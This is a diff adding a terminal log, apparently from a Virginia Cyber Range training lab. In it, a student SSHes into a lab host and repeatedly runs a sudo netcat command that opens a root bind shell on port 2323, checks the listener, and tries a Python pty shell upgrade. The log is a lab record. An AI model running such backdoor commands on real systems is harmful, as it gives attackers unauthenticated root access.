@@ -1,0 +1,70 @@
+__     ___    ____ ____  
+\ \   / / \  / ___|  _ \ 
+ \ \ / / _ \| |   | |_) |
+  \ V / ___ \ |___|  _ < 
+   \_/_/   \_\____|_| \_\
+    VirginiaCyberRange.org
+
+
+student@kali:~$ ssh joe@10.1.44.155
+joe@10.1.44.155's password: 
+Permission denied, please try again.
+joe@10.1.44.155's password: 
+Permission denied, please try again.
+joe@10.1.44.155's password: 
+joe@10.1.44.155: Permission denied (publickey,password).
+student@kali:~$ ssh joe@10.1.44.155
+joe@10.1.44.155's password: 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-1018-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  Get cloud support with Ubuntu Advantage Cloud Guest:
+    http://www.ubuntu.com/business/services/cloud
+
+38 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Thu Feb 27 22:11:05 2020 from 10.1.33.251
+joe@ip-10-1-44-155:~$ sudo nc -l -p 2323 -e /bin/bash &
+[1] 1697
+joe@ip-10-1-44-155:~$ 
+joe@ip-10-1-44-155:~$ 
+joe@ip-10-1-44-155:~$ 
+joe@ip-10-1-44-155:~$ ls
+passwd  shadow  testfile
+
+[1]+  Stopped                 sudo nc -l -p 2323 -e /bin/bash
+joe@ip-10-1-44-155:~$ sudo echo test
+[sudo] password for joe: 
+test
+joe@ip-10-1-44-155:~$ sudo nc -l -p 2323 -e /bin/bash &
+[2] 1701
+joe@ip-10-1-44-155:~$ netstat -vat | grep 2323
+tcp        0      0 *:2323                  *:*                     LISTEN     
+joe@ip-10-1-44-155:~$ 
+joe@ip-10-1-44-155:~$ 
+joe@ip-10-1-44-155:~$ 
+joe@ip-10-1-44-155:~$ bash: line 2: syntax error near unexpected token `“/bin/bash”'
+bash: line 2: `python -c ‘import pty; pty.spawn(“/bin/bash”)’'
+netstat -vat | grep 23^C
+[2]-  Exit 2                  sudo nc -l -p 2323 -e /bin/bash
+joe@ip-10-1-44-155:~$ sudo echo test
+test
+joe@ip-10-1-44-155:~$ sudo nc -l -p 2323 -e /bin/bash &
+[2] 1728
+joe@ip-10-1-44-155:~$ netstat -vat | grep 2323
+tcp        0      0 *:2323                  *:*                     LISTEN     
+joe@ip-10-1-44-155:~$ sudo nc -l -p 2323 -e /bin/bash &
+[3] 1819
+joe@ip-10-1-44-155:~$ sudo: unknown uid 1002: who are you?
+^C
+[3]-  Exit 1                  sudo nc -l -p 2323 -e /bin/bash
+joe@ip-10-1-44-155:~$ sudo echo test
+sudo: unknown uid 1002: who are you?
+joe@ip-10-1-44-155:~$ ls
+joe@ip-10-1-44-155:~$ ls
+joe@ip-10-1-44-155:~$ 
